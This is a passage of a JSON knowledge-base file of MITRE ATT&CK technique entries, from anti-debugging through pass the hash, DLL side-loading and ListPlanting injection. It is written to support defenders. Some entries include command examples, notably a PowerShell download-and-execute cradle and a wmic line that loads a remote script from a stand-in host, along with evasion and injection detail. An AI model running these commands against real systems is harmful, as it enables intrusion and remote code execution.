error).^[[2]](https://github.com/hasherezade/malware_training_vol1/blob/main/slides/module3/Module3_2_fingerprinting.pdf)^^[[3]](https://github.com/LordNoteworthy/al-khaser/tree/master/al-khaser/AntiDebug)^^[[4]](https://github.com/vxunderground/VX-API/tree/main/Anti%20Debug)^\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as `OutputDebugStringW()`.^[[5]](https://objective-see.com/blog/blog_0x60.html)^^[[6]](https://research.checkpoint.com/2021/stopping-serial-killer-catching-the-next-strike/)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion","Discovery"],"campaigns":["Operation Dream Job"],"groups":[]},"T1036.006":{"id":"T1036.006","name":"Space after Filename","description":"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called `evil.bin`, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to `evil.txt`, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to `evil.txt ` (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed ^[[1]](https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/)^.\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.","platforms":["Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1547.007":{"id":"T1547.007","name":"Re-opened Applications","description":"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".^[[1]](https://support.apple.com/en-us/HT204005)^ When selected, all applications currently open are added to a property list file named `com.apple.loginwindow.[UUID].plist` within the `~/Library/Preferences/ByHost` directory.^[[2]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^^[[3]](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)^ Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the `com.apple.loginwindow.[UUID].plist` file to execute payloads when a user logs in.","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1608.006":{"id":"T1608.006","name":"SEO Poisoning","description":"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.^[[1]](https://atlas-cybersecurity.com/cyber-threats/threat-actors-use-search-engine-optimization-tactics-to-redirect-traffic-and-install-malware/)^^[[2]](https://www.malwarebytes.com/blog/news/2018/05/seo-poisoning-is-it-worth-it)^\n\nTo help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).^[[3]](https://www.zscaler.com/blogs/security-research/ubiquitous-seo-poisoning-urls-0)^^[[1]](https://atlas-cybersecurity.com/cyber-threats/threat-actors-use-search-engine-optimization-tactics-to-redirect-traffic-and-install-malware/)^\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.^[[2]](https://www.malwarebytes.com/blog/news/2018/05/seo-poisoning-is-it-worth-it)^^[[4]](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)^\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.^[[3]](https://www.zscaler.com/blogs/security-research/ubiquitous-seo-poisoning-urls-0)^^[[5]](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1550.002":{"id":"T1550.002","name":"Pass the Hash","description":"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.^[[1]](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)^","platforms":["Windows"],"tactics":["Defense Evasion","Lateral Movement"],"campaigns":["Night Dragon"],"groups":["APT32","APT28","Chimera","APT1","Wizard Spider","Kimsuky","FIN13","GALLIUM","Night Dragon"]},"T1052":{"id":"T1052","name":"Exfiltration Over Physical Medium","description":"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1574.002":{"id":"T1574.002","name":"DLL Side-Loading","description":"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.^[[1]](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)^","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":["Operation CuckooBees"],"groups":["Chimera","MuddyWater","Patchwork","Threat Group-3390","GALLIUM","Higaisa","APT32","Tropic Trooper","Earth Lusca","LuminousMoth","BRONZE BUTLER","APT3","BlackTech","FIN13","Mustang Panda","APT41","SideCopy","Naikon","menuPass","Lazarus Group","APT19","Sidewinder"]},"T1105":{"id":"T1105","name":"Ingress Tool Transfer","description":"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as `IEX(New-Object Net.WebClient).downloadString()` and `Invoke-WebRequest`. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.^[[1]](https://lolbas-project.github.io/#t1105)^\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts.\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.^[[2]](https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf)^ In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.^[[3]](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)^","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["CostaRicto","Operation Dream Job","C0027","Frankenstein","C0015","2015 Ukraine Electric Power Attack","C0021","FunnyDream","C0026","SolarWinds Compromise","C0010","Operation Sharpshooter","Operation Honeybee","C0018","Night Dragon","Operation Wocao","C0017"],"groups":["Fox Kitten","BITTER","HAFNIUM","Cobalt Group","Tropic Trooper","Lazarus Group","PLATINUM","Ke3chang","Whitefly","APT37","SideCopy","TA2541","Kimsuky","Turla","Gamaredon Group","Leviathan","menuPass","Molerats","APT29","Rocke","Sidewinder","Magic Hound","Aquatic Panda","APT38","LuminousMoth","Gorgon Group","APT39","APT28","Threat Group-3390","Rancor","FIN13","MuddyWater","APT18","TeamTNT","OilRig","LazyScripter","APT32","Silence","Confucius","Ember Bear","APT33","Wizard Spider","Volatile Cedar","Evilnum","FIN7","TA505","APT41","Nomadic Octopus","BackdoorDiplomacy","HEXANE","Winnti Group","APT-C-36","FIN8","Windshift","TA551","Mustang Panda","Dragonfly","Moses Staff","Darkhotel","WIRTE","BRONZE BUTLER","Indrik Spider","Patchwork","ZIRCONIUM","GALLIUM","Metador","Sandworm Team","Andariel","Ajax Security Team","Elderwood","APT3","Chimera","Tonto Team","IndigoZebra","UNC2452","Frankenstein","Sharpshooter","Operation Wocao","Dragonfly 2.0","APT34"]},"T1098.002":{"id":"T1098.002","name":"Additional Email Delegate Permissions","description":"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the `Add-MailboxPermission` [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.^[[1]](https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps)^^[[2]](https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf)^^[[3]](https://www.crowdstrike.com/blog/hiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises/)^ In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.^[[4]](https://support.google.com/a/answer/7223765?hl=en)^^[[5]](https://googleblog.blogspot.com/2011/06/ensuring-your-information-is-safe.html)^ \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.^[[6]](https://www.fireeye.com/blog/threat-research/2021/01/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452.html)^\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.^[[7]](https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365)^","platforms":["Windows","Office 365","Google Workspace"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["SolarWinds Compromise"],"groups":["Magic Hound","APT28","APT29","UNC2452"]},"T1588.003":{"id":"T1588.003","name":"Code Signing Certificates","description":"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.^[[1]](https://en.wikipedia.org/wiki/Code_signing)^ Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job"],"groups":["Wizard Spider","BlackTech","Ember Bear","FIN8","Threat Group-3390","Lazarus Group"]},"T1648":{"id":"T1648","name":"Serverless Execution","description":"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).^[[1]](https://www.cadosecurity.com/cado-discovers-denonia-the-first-malware-specifically-targeting-lambda/)^ Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.^[[2]](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)^^[[3]](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)^\n\nServerless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.^[[4]](https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9)^ Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.^[[5]](https://www.varonis.com/blog/power-automate-data-exfiltration)^^[[6]](https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team)^","platforms":["SaaS","IaaS","Office 365"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1055.008":{"id":"T1055.008","name":"Ptrace System Calls","description":"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.^[[1]](http://man7.org/linux/man-pages/man2/ptrace.2.html)^ Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: `malloc`) then invoking that memory with `PTRACE_SETREGS` to set the register containing the next instruction to execute. Ptrace system call injection can also be done with `PTRACE_POKETEXT`/`PTRACE_POKEDATA`, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). ^[[1]](http://man7.org/linux/man-pages/man2/ptrace.2.html)^^[[2]](https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be)^ \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.^[[3]](https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf)^ \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Linux"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1653":{"id":"T1653","name":"Power Settings","description":"Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.^[[1]](https://www.avg.com/en/signal/should-you-shut-down-sleep-or-hibernate-your-pc-or-mac-laptop)^\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.^[[2]](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options?adlt=strict)^^[[3]](https://man7.org/linux/man-pages/man5/systemd-sleep.conf.5.html)^\n\nFor example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.^[[4]](https://securityintelligence.com/news/two-new-monero-malware-attacks-target-windows-and-android-users/)^ Adversaries may also extend system lock screen timeout settings.^[[5]](https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html)^ Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.^[[6]](https://www.avira.com/en/blog/coinloader-a-sophisticated-malware-loader-campaign)^\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.^[[7]](https://www.fortinet.com/blog/threat-research/condi-ddos-botnet-spreads-via-tp-links-cve-2023-1389)^","platforms":["Windows","Linux","macOS","Network"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1027.007":{"id":"T1027.007","name":"Dynamic API Resolution","description":"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.^[[1]](https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection)^^[[2]](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware)^\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).^[[3]](https://www.blackhat.com/docs/us-15/materials/us-15-Choi-API-Deobfuscator-Resolving-Obfuscated-API-Functions-In-Modern-Packers.pdf)^^[[4]](https://dr4k0nia.github.io/dotnet/coding/2022/08/10/HInvoke-and-avoiding-PInvoke.html?s=03)^^[[1]](https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Lazarus Group"]},"T1021.001":{"id":"T1021.001","name":"Remote Desktop Protocol","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).^[[1]](https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx)^ \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.^[[2]](http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/)^","platforms":["Windows"],"tactics":["Lateral Movement"],"campaigns":["SolarWinds Compromise","C0018","C0015"],"groups":["Kimsuky","OilRig","Patchwork","FIN8","APT39","Magic Hound","Wizard Spider","FIN7","Silence","HEXANE","Axiom","TEMP.Veles","Cobalt Group","FIN6","FIN10","FIN13","Blue Mockingbird","menuPass","Lazarus Group","APT3","Fox Kitten","Leviathan","Dragonfly","APT41","Chimera","APT1","APT29","Stolen Pencil","Dragonfly 2.0"]},"T1037.001":{"id":"T1037.001","name":"Logon Script (Windows)","description":"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.^[[1]](https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx)^ This is done via adding a path to a script to the `HKCU\\Environment\\UserInitMprLogonScript` Registry key.^[[2]](http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/)^\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["APT28","Cobalt Group"]},"T1055.015":{"id":"T1055.015","name":"ListPlanting","description":"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.^[[1]](https://docs.microsoft.com/windows/win32/controls/list-view-controls-overview)^ Information about an application's list-view settings are stored within the process' memory in a `SysListView32` control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.^[[2]](https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/)^ Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the `SysListView32` child of the victim process window (via Windows API calls such as `FindWindow` and/or `EnumWindows`) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored `WriteProcessMemory` function. For example, an adversary can use the `PostMessage` and/or `SendMessage` API functions to send `LVM_SETITEMPOSITION` and `LVM_GETITEMPOSITION` messages, effectively copying a payload 2 bytes at a time to the allocated memory.^[[3]](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)^ \n\nFinally, the payload is triggered by sending the `LVM_SORTITEMS` message to the `SysListView32` child of the process window, with the payload within the newly allocated buffer passed and executed as the `ListView_SortItems` callback.","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1484":{"id":"T1484","name":"Domain Policy Modification","description":"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\n\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment^[[1]](https://adsecurity.org/?p=2716)^^[[2]](https://wald0.com/?p=179)^^[[3]](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)^ or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.^[[4]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^ Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.","platforms":["Windows","Azure AD"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1220":{"id":"T1220","name":"XSL Script Processing","description":"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. ^[[1]](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)^\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) ^[[2]](https://www.microsoft.com/download/details.aspx?id=21714)^ can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. ^[[3]](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)^ Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. ^[[4]](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)^ Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.^[[5]](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)^\n\nCommand-line examples:^[[3]](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)^^[[5]](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)^\n\n* `msxsl.exe customers[.]xml script[.]xsl`\n* `msxsl.exe script[.]xsl script[.]xsl`\n* `msxsl.exe script[.]jpeg script[.]jpeg`\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.^[[6]](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)^ This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.^[[5]](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)^\n\nCommand-line examples:^[[5]](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)^^[[6]](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)^\n\n* Local File: `wmic process list /FORMAT:evil[.]xsl`\n* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job"],"groups":["Cobalt Group","Higaisa","Lazarus Group"]},"T1596.005":{"id":"T1596.005","name":"Scan Databases","description":"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.^[[1]](https://shodan.io)^\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1564.001":{"id":"T1564.001","name":"Hidden Files and Directories","description":"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (`dir /a` for Windows and `ls –a` for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  ^[[1]](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)^ ^[[2]](https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/)^. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app ^[[3]](https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf)^. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.","platforms":["Windows","macOS","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT28","LuminousMoth","Lazarus Group","Mustang Panda","Tropic Trooper","Rocke","FIN13","Transparent Tribe","HAFNIUM","APT32"]},"T1578.001":{"id":"T1578.001","name":"Create Snapshot","description":"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a 